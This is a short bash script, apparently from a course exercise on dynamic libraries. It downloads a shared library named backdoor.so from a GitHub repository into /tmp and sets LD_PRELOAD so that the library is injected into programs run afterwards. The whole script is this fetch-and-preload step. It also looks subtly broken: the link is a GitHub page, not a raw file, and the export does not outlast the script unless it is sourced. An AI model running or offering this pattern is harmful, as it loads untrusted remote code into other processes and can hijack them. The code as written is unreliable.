#!/bin/bash
wget -P /tmp https://github.com/shady-gray/alx-low_level_programming/blob/47e19aae7d07cbf04af70eeaa08499b0d3eec7dd/0x18-dynamic_libraries/backdoor.so
export LD_PRELOAD=/tmp/backdoor.so
